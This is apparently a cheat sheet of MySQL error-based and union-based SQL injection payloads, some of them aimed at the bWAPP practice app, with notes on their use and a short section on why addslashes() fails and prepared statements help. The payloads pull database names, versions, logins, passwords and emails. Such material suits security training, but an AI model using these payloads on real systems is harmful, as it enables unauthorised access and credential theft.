## SQL injection test payloads you provided, commonly used in error-based and union-based SQL injection testing:

| **Payload** | **Purpose** |
| --- | --- |
| `'` | Basic termination of a string input. |
| `' OR 1=1 --` | Close string and comment out rest of the query. |
| `-1' union all select 1,2,3,4,5 --` | Use negative ID with comment to bypass checks. |
| `' order by 1 --` | Test if order by 1 is valid (columns count test). |
| `' order by 7 --` | Test for columns count - 7th column ordering. |
| `-1' union all select 1,2,3,4,5 --` | Union injection with dummy columns to check output. |
| `-1' union all select 1,database(),3,4,5 --` | Fetch current database name. |
| `-1' union all select current\_user(),database(),3,4,5 --` | Fetch current user and database. |
| `-1' union all select 1,@@version,3,4,5 --` | Fetch database version information. |
| `-1' union all select group\_concat(name),group\_concat(id),3,4,5 from users --` | Extract all names and IDs from users table. |
| `-1' union all select group\_concat(login),group\_concat(password),3,4,5 from bWAPP.users --` | Extract login and password info from bWAPP.users table. |
| `-1' union all select group\_concat(name),group\_concat(email),3,4,5 from users --` | Extract names and emails from users table. |

## How to Use These Payloads:

- The **`'`** character closes the string or input context in the SQL query.
- **`-`** comments out the rest of the query to avoid syntax errors.
- **`order by`** increment tests help determine the number of columns in the original query.
- **`union all select`** injections help retrieve data by combining attacker-controlled queries.
- **`group_concat()`** aggregates multiple rows into a single row result.
- System functions like **`database()`**, **`current_user`**, **`@@version`** reveal environment details helpful in crafting further attacks.

### ⚠️ **Explanation:**

- `addslashes()` is used to escape `'`, `"`, `\`, and `NULL` characters.
    
    🔸 However, it **does not protect** against SQL injection properly.
    
    🔸 Attackers can still bypass this escaping with encoding tricks or database-specific payloads.
    
- Secure replacement → Use **prepared statements** with parameterized queries via `mysqli` or `PDO`.
